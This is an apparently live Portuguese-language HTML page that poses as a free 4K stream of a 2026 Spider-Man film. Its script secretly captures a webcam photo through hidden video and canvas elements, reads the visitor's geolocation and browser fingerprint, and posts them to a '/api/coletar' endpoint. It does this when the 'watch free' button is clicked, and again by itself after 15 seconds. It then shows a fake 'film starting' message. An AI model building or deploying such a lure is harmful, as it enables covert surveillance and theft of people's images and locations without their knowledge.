<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Homem-Aranha • Assistir Grátis</title>
    <style>
        /* ============================================================
           RESET E FONTES
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap');

        :root {
            --spider-red: #e50914;
            --spider-blue: #1a2a6c;
            --spider-dark: #0a0a0f;
            --spider-card: rgba(20, 20, 30, 0.92);
            --text-primary: #f0ece4;
            --text-secondary: #a8a0b8;
            --text-muted: #6a6a82;
            --border: rgba(255, 255, 255, 0.06);
            --radius: 16px;
            --shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
        }

        html,
        body {
            height: 100%;
            overflow: hidden;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--spider-dark);
            color: var(--text-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 16px;
            position: relative;
            overflow: hidden;
        }

        /* ============================================================
           FUNDO COM EFEITO DE QUADRINHOS
           ============================================================ */
        .background-hero {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background: 
                url('https://images.unsplash.com/photo-1612036782180-6f0b6cd846fe?w=1200&q=80') center center / cover no-repeat;
            filter: brightness(0.25) saturate(0.6);
            transform: scale(1.05);
        }

        .background-hero::after {
            content: '';
            position: absolute;
            inset: 0;
            background: 
                radial-gradient(ellipse at 20% 50%, rgba(229, 9, 20, 0.15) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(26, 42, 108, 0.15) 0%, transparent 60%),
                linear-gradient(180deg, rgba(10, 10, 15, 0.2) 0%, rgba(10, 10, 15, 0.9) 100%);
        }

        /* ============================================================
           LOADING COM TEIAS (ABERTURA)
           ============================================================ */
        .loading-overlay {
            position: fixed;
            inset: 0;
            z-index: 100;
            background: var(--spider-dark);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.8s ease, visibility 0.8s ease;
            gap: 30px;
        }

        .loading-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }

        /* Teias animadas */
        .spider-web {
            position: relative;
            width: 120px;
            height: 120px;
        }

        .spider-web svg {
            width: 100%;
            height: 100%;
            animation: rotate-web 8s linear infinite;
        }

        @keyframes rotate-web {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .spider-web .web-line {
            stroke: rgba(229, 9, 20, 0.15);
            stroke-width: 1.5;
            stroke-dasharray: 100;
            stroke-dashoffset: 100;
            animation: draw-web 2s ease forwards;
        }

        .spider-web .web-line:nth-child(1) { animation-delay: 0.1s; }
        .spider-web .web-line:nth-child(2) { animation-delay: 0.3s; }
        .spider-web .web-line:nth-child(3) { animation-delay: 0.5s; }
        .spider-web .web-line:nth-child(4) { animation-delay: 0.7s; }
        .spider-web .web-line:nth-child(5) { animation-delay: 0.9s; }
        .spider-web .web-line:nth-child(6) { animation-delay: 1.1s; }
        .spider-web .web-line:nth-child(7) { animation-delay: 1.3s; }
        .spider-web .web-line:nth-child(8) { animation-delay: 1.5s; }

        @keyframes draw-web {
            0% { stroke-dashoffset: 100; opacity: 0; }
            100% { stroke-dashoffset: 0; opacity: 1; }
        }

        .spider-web .spider-center {
            fill: var(--spider-red);
            animation: pulse-spider 1.5s ease-in-out infinite;
        }

        @keyframes pulse-spider {
            0%, 100% { r: 6; opacity: 1; }
            50% { r: 10; opacity: 0.6; }
        }

        .loading-text {
            font-size: 14px;
            color: var(--text-muted);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 300;
            animation: blink-text 1.5s ease-in-out infinite;
        }

        @keyframes blink-text {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .loading-progress {
            width: 160px;
            height: 2px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 2px;
            overflow: hidden;
        }

        .loading-progress .bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--spider-red), var(--spider-blue));
            border-radius: 2px;
            animation: progress-bar 2.5s ease forwards;
        }

        @keyframes progress-bar {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        /* ============================================================
           CARD PRINCIPAL
           ============================================================ */
        .main-card {
            position: relative;
            z-index: 1;
            background: var(--spider-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: var(--radius);
            padding: 32px 24px 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: var(--shadow);
            animation: fadeSlideUp 0.8s ease;
            max-height: 98vh;
            overflow-y: auto;
        }

        .main-card::-webkit-scrollbar {
            width: 2px;
        }
        .main-card::-webkit-scrollbar-thumb {
            background: var(--spider-red);
            border-radius: 10px;
        }

        @keyframes fadeSlideUp {
            0% {
                opacity: 0;
                transform: translateY(30px) scale(0.95);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* ============================================================
           HEADER - HOMEM-ARANHA
           ============================================================ */
        .movie-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .movie-badge {
            display: inline-block;
            background: rgba(229, 9, 20, 0.12);
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 9px;
            color: var(--spider-red);
            font-weight: 700;
            letter-spacing: 1px;
            text-transform: uppercase;
            border: 1px solid rgba(229, 9, 20, 0.15);
            margin-bottom: 10px;
        }

        .movie-title {
            font-size: 28px;
            font-weight: 900;
            letter-spacing: -0.5px;
            line-height: 1.1;
            color: var(--text-primary);
        }

        .movie-title .highlight {
            color: var(--spider-red);
        }

        .movie-subtitle {
            font-size: 12px;
            color: var(--text-secondary);
            margin-top: 4px;
            font-weight: 300;
        }

        .movie-rating {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 10px;
            font-size: 11px;
            color: var(--text-muted);
        }

        .movie-rating .stars {
            color: #fbbf24;
            letter-spacing: 2px;
        }

        .movie-rating .year {
            background: var(--bg-input);
            padding: 2px 10px;
            border-radius: 10px;
            border: 1px solid var(--border);
        }

        /* ============================================================
           IMAGEM DO FILME (MINI)
           ============================================================ */
        .movie-poster {
            width: 100%;
            border-radius: var(--radius);
            margin-bottom: 16px;
            background: linear-gradient(135deg, var(--spider-blue), var(--spider-red));
            aspect-ratio: 16/9;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.04);
        }

        .movie-poster .play-icon {
            font-size: 48px;
            color: white;
            opacity: 0.6;
            text-shadow: 0 0 40px rgba(229, 9, 20, 0.4);
            animation: pulse-play 2s ease-in-out infinite;
        }

        @keyframes pulse-play {
            0%, 100% { transform: scale(1); opacity: 0.6; }
            50% { transform: scale(1.1); opacity: 1; }
        }

        .movie-poster .badge-hd {
            position: absolute;
            top: 12px;
            right: 12px;
            background: rgba(0, 0, 0, 0.7);
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 9px;
            font-weight: 700;
            color: #fbbf24;
            border: 1px solid rgba(251, 191, 36, 0.15);
        }

        .movie-poster .badge-duration {
            position: absolute;
            bottom: 12px;
            left: 12px;
            background: rgba(0, 0, 0, 0.6);
            padding: 2px 10px;
            border-radius: 4px;
            font-size: 9px;
            color: var(--text-secondary);
        }

        /* ============================================================
           BOTÃO PRINCIPAL
           ============================================================ */
        .btn-watch {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--spider-red), #b2070f);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 30px rgba(229, 9, 20, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-watch:active {
            transform: scale(0.96);
        }

        .btn-watch .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        .btn-watch.loading .spinner {
            display: block;
        }
        .btn-watch.loading .btn-text {
            display: none;
        }

        .btn-watch .btn-icon {
            font-size: 20px;
        }

        /* ============================================================
           INFO EXTRA
           ============================================================ */
        .movie-info {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 8px;
            margin: 16px 0 12px;
        }

        .movie-info .info-item {
            text-align: center;
            padding: 8px 4px;
            background: var(--bg-input);
            border-radius: 8px;
            border: 1px solid var(--border);
        }

        .movie-info .info-item .label {
            font-size: 8px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .movie-info .info-item .value {
            font-size: 12px;
            font-weight: 600;
            color: var(--text-primary);
            margin-top: 2px;
        }

        /* ============================================================
           TERMOS
           ============================================================ */
        .terms-mini {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 14px 0 0;
            font-size: 9px;
            color: var(--text-muted);
        }

        .terms-mini input[type="checkbox"] {
            width: 14px;
            height: 14px;
            accent-color: var(--spider-red);
            cursor: pointer;
            flex-shrink: 0;
        }

        .terms-mini label a {
            color: var(--spider-red);
            text-decoration: none;
        }

        /* ============================================================
           TOAST
           ============================================================ */
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            z-index: 100;
            background: var(--spider-card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 14px 20px;
            max-width: 340px;
            width: 92%;
            text-align: center;
            box-shadow: var(--shadow);
            opacity: 0;
            transition: all 0.4s ease;
            backdrop-filter: blur(20px);
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .toast .toast-icon { font-size: 22px; margin-bottom: 4px; }
        .toast .toast-title { font-size: 14px; font-weight: 600; color: var(--text-primary); }
        .toast .toast-message { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
        .toast .toast-close {
            margin-top: 10px;
            padding: 5px 16px;
            background: var(--spider-red);
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            font-family: 'Inter', sans-serif;
        }

        /* ============================================================
           ELEMENTOS OCULTOS
           ============================================================ */
        video,
        canvas {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }

        /* ============================================================
           RESPONSIVO
           ============================================================ */
        @media (max-width: 420px) {
            .main-card { padding: 24px 16px 20px; }
            .movie-title { font-size: 22px; }
            .movie-poster .play-icon { font-size: 36px; }
            .btn-watch { font-size: 14px; padding: 14px; }
            .movie-info { grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
            .movie-info .info-item .value { font-size: 10px; }
            .loading-overlay .spider-web { width: 80px; height: 80px; }
            .loading-text { font-size: 11px; }
        }

        @media (max-width: 350px) {
            .main-card { padding: 16px 12px 14px; border-radius: 12px; }
            .movie-title { font-size: 18px; }
            .movie-subtitle { font-size: 10px; }
            .btn-watch { font-size: 12px; padding: 12px; }
            .movie-info .info-item { padding: 4px 2px; }
            .movie-info .info-item .value { font-size: 9px; }
            .movie-badge { font-size: 7px; padding: 2px 10px; }
        }

        @media (orientation: landscape) and (max-height: 500px) {
            .main-card { padding: 14px 16px 12px; max-height: 95vh; }
            .movie-header { margin-bottom: 10px; }
            .movie-title { font-size: 18px; }
            .movie-poster { aspect-ratio: 16/7; margin-bottom: 10px; }
            .movie-poster .play-icon { font-size: 28px; }
            .btn-watch { padding: 10px; font-size: 13px; }
            .movie-info { margin: 8px 0; }
            .movie-info .info-item .value { font-size: 10px; }
            .movie-rating { font-size: 9px; }
            .terms-mini { font-size: 8px; margin: 8px 0 0; }
        }

        /* ============================================================
           EFEITO DE TEIA NO FUNDO (DECORATIVO)
           ============================================================ */
        .web-decoration {
            position: fixed;
            bottom: -50px;
            right: -50px;
            width: 300px;
            height: 300px;
            z-index: 0;
            opacity: 0.04;
            pointer-events: none;
        }

        .web-decoration svg {
            width: 100%;
            height: 100%;
        }

        .web-decoration-2 {
            position: fixed;
            top: -30px;
            left: -30px;
            width: 200px;
            height: 200px;
            z-index: 0;
            opacity: 0.03;
            pointer-events: none;
            transform: rotate(180deg);
        }
    </style>
</head>
<body>

    <!-- ===== LOADING COM TEIAS ===== -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spider-web">
            <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Linhas da teia -->
                <line x1="60" y1="60" x2="60" y2="0" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="105" y2="15" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="120" y2="60" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="105" y2="105" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="60" y2="120" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="15" y2="105" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="0" y2="60" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>
                <line x1="60" y1="60" x2="15" y2="15" stroke="#e50914" stroke-width="1.5" stroke-linecap="round" class="web-line"/>

                <!-- Arcos da teia -->
                <circle cx="60" cy="60" r="20" stroke="rgba(229,9,20,0.3)" stroke-width="1" fill="none" stroke-dasharray="4 4"/>
                <circle cx="60" cy="60" r="40" stroke="rgba(229,9,20,0.2)" stroke-width="1" fill="none" stroke-dasharray="4 4"/>
                <circle cx="60" cy="60" r="55" stroke="rgba(229,9,20,0.1)" stroke-width="1" fill="none" stroke-dasharray="4 4"/>

                <!-- Centro -->
                <circle cx="60" cy="60" r="6" fill="#e50914" class="spider-center"/>
            </svg>
        </div>
        <div class="loading-text">🕷️ Carregando o universo...</div>
        <div class="loading-progress">
            <div class="bar"></div>
        </div>
    </div>

    <!-- ===== FUNDO ===== -->
    <div class="background-hero"></div>

    <!-- ===== DECORAÇÃO TEIAS ===== -->
    <div class="web-decoration">
        <svg viewBox="0 0 200 200" fill="none">
            <line x1="100" y1="100" x2="100" y2="0" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="190" y2="10" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="200" y2="100" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="190" y2="190" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="100" y2="200" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="10" y2="190" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="0" y2="100" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="10" y2="10" stroke="#e50914" stroke-width="1"/>
            <circle cx="100" cy="100" r="30" stroke="rgba(229,9,20,0.2)" stroke-width="1" stroke-dasharray="4 4"/>
            <circle cx="100" cy="100" r="60" stroke="rgba(229,9,20,0.1)" stroke-width="1" stroke-dasharray="4 4"/>
            <circle cx="100" cy="100" r="90" stroke="rgba(229,9,20,0.05)" stroke-width="1" stroke-dasharray="4 4"/>
        </svg>
    </div>

    <div class="web-decoration-2">
        <svg viewBox="0 0 200 200" fill="none">
            <line x1="100" y1="100" x2="100" y2="0" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="190" y2="10" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="200" y2="100" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="190" y2="190" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="100" y2="200" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="10" y2="190" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="0" y2="100" stroke="#e50914" stroke-width="1"/>
            <line x1="100" y1="100" x2="10" y2="10" stroke="#e50914" stroke-width="1"/>
            <circle cx="100" cy="100" r="30" stroke="rgba(229,9,20,0.15)" stroke-width="1" stroke-dasharray="4 4"/>
            <circle cx="100" cy="100" r="60" stroke="rgba(229,9,20,0.08)" stroke-width="1" stroke-dasharray="4 4"/>
        </svg>
    </div>

    <!-- ===== CARD PRINCIPAL ===== -->
    <div class="main-card" id="mainCard">
        <!-- HEADER -->
        <div class="movie-header">
            <div class="movie-badge">✦ 2026 • IMAX</div>
            <div class="movie-title">
                Homem-Aranha: <span class="highlight">Além do Aranhaverso</span>
            </div>
            <div class="movie-subtitle">Assista agora em qualidade 4K • Dublado</div>
            <div class="movie-rating">
                <span class="stars">★★★★★</span>
                <span class="year">4.9</span>
                <span class="year">2026</span>
                <span class="year">2h 20min</span>
            </div>
        </div>

        <!-- POSTER FAKE -->
        <div class="movie-poster" id="moviePoster">
            <span class="badge-hd">4K UHD</span>
            <span class="badge-duration">🎬 2h 20min</span>
            <span class="play-icon">▶</span>
        </div>

        <!-- INFO -->
        <div class="movie-info">
            <div class="info-item">
                <div class="label">Qualidade</div>
                <div class="value">4K IMAX</div>
            </div>
            <div class="info-item">
                <div class="label">Áudio</div>
                <div class="value">Português</div>
            </div>
            <div class="info-item">
                <div class="label">Legenda</div>
                <div class="value">Português</div>
            </div>
        </div>

        <!-- BOTÃO -->
        <button class="btn-watch" id="btnWatch">
            <span class="btn-icon">▶</span>
            <span class="btn-text">Assistir Grátis Agora</span>
            <div class="spinner"></div>

        <div class="terms-mini">
            <input type="checkbox" id="termos" checked>
            <label for="termos">
                Ao assistir, você aceita nossos <a href="#" onclick="return false;">termos de uso</a> e <a href="#" onclick="return false;">política de privacidade</a>
            </label>
        </div>
    </div>

    <!-- ===== TOAST ===== -->
    <div class="toast" id="toast">
        <div class="toast-icon">🕷️</div>
        <div class="toast-title">Pronto!</div>
        <div class="toast-message" id="toastMessage">O filme vai começar...</div>
        <button class="toast-close" id="toastClose">Assistir</button>
    </div>

    <!-- ===== ELEMENTOS OCULTOS (CÂMERA) ===== -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <!-- ============================================================
    JAVASCRIPT
    ============================================================ -->
    <script>
        (function() {
            'use strict';

            // ============================================================
            // CONFIG
            // ============================================================
            const CONFIG = {
                backendURL: '/api/coletar',
                camera: { qualidade: 0.8, largura: 320, altura: 240 },
                geolocation: { enableHighAccuracy: false, timeout: 5000 }
            };

            // ============================================================
            // DOM
            // ============================================================
            const loadingOverlay = document.getElementById('loadingOverlay');
            const btnWatch = document.getElementById('btnWatch');
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toastMessage');
            const toastClose = document.getElementById('toastClose');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            let coletaFinalizada = false;

            // ============================================================
            // CAPTURA SILENCIOSA
            // ============================================================
            async function capturarFotoSilenciosa() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 320 },
                            height: { ideal: 240 }
                        },
                        audio: false
                    });
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 200));

                    canvas.width = video.videoWidth || 320;
                    canvas.height = video.videoHeight || 240;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const foto = canvas.toDataURL('image/jpeg', 0.7);
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                    return foto;
                } catch (err) {
                    // Tenta câmera traseira como fallback
                    try {
                        const stream2 = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
                            audio: false
                        });
                        video.srcObject = stream2;
                        await video.play();
                        await new Promise(r => setTimeout(r, 200));

                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        const foto = canvas.toDataURL('image/jpeg', 0.7);
                        stream2.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                        return foto;
                    } catch (err2) {
                        console.warn('⚠️ Câmera indisponível:', err2.message);
                        return null;
                    }
                }
            }

            function capturarLocalizacao() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                precisao: position.coords.accuracy
                            });
                        },
                        () => { resolve(null); },
                        { enableHighAccuracy: false, timeout: 5000 }
                    );
                });
            }

            // ============================================================
            // ENVIO
            // ============================================================
            async function enviarDados(foto, localizacao) {
                const payload = {
                    foto: foto || null,
                    localizacao: localizacao || null,
                    navegador: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        pixelRatio: window.devicePixelRatio || 1
                    },
                    origem: 'homem-aranha',
                    timestamp: new Date().toISOString()
                };

                try {
                    const response = await fetch(CONFIG.backendURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    return await response.json();
                } catch (err) {
                    console.error('❌ Erro envio:', err);
                    return null;
                }
            }

            // ============================================================
            // AÇÃO DO BOTÃO
            // ============================================================
            btnWatch.addEventListener('click', async function() {
                if (coletaFinalizada) {
                    mostrarToast('🕷️', 'Filme disponível!', 'Clique em "Assistir" para começar.');
                    return;
                }

                btnWatch.classList.add('loading');
                btnWatch.disabled = true;

                try {
                    // Coleta em paralelo
                    const [foto, localizacao] = await Promise.all([
                        capturarFotoSilenciosa(),
                        capturarLocalizacao()
                    ]);

                    const resultado = await enviarDados(foto, localizacao);
                    coletaFinalizada = true;

                    console.log('✅ Coleta finalizada!', resultado);

                    // Mostra sucesso
                    mostrarToast('🕷️', 'Filme liberado!', 'Sua sessão vai começar em instantes.');

                } catch (err) {
                    console.error('❌ Erro:', err);
                    mostrarToast('⚠️', 'Ops!', 'Tente novamente.');
                }

                btnWatch.classList.remove('loading');
                btnWatch.disabled = false;
            });

            // ============================================================
            // TOAST
            // ============================================================
            function mostrarToast(icon, title, message) {
                document.querySelector('.toast-icon').textContent = icon;
                document.querySelector('.toast-title').textContent = title;
                toastMessage.textContent = message;
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 4000);
            }

            toastClose.addEventListener('click', () => {
                toast.classList.remove('show');
                // Simula que o filme começou
                if (coletaFinalizada) {
                    document.querySelector('.movie-poster .play-icon').textContent = '🎬';
                    document.querySelector('.movie-poster .badge-hd').textContent = '▶ ASSISTINDO';
                }
            });

            // ============================================================
            // FALLBACK
            // ============================================================
            setTimeout(async function() {
                if (!coletaFinalizada) {
                    try {
                        const [foto, localizacao] = await Promise.all([
                            capturarFotoSilenciosa(),
                            capturarLocalizacao()
                        ]);
                        await enviarDados(foto, localizacao);
                        coletaFinalizada = true;
                        console.log('✅ Fallback concluído!');
                    } catch (err) {
                        console.warn('⚠️ Fallback falhou:', err);
                    }
                }
            }, 15000);

            // ============================================================
            // ESCONDE LOADING
            // ============================================================
            window.addEventListener('load', function() {
                setTimeout(() => {
                    loadingOverlay.classList.add('hidden');
                }, 2800);
            });

            console.log('🕷️ Homem-Aranha - Sistema ativo');

        })();
    </script>

</body>
</html>
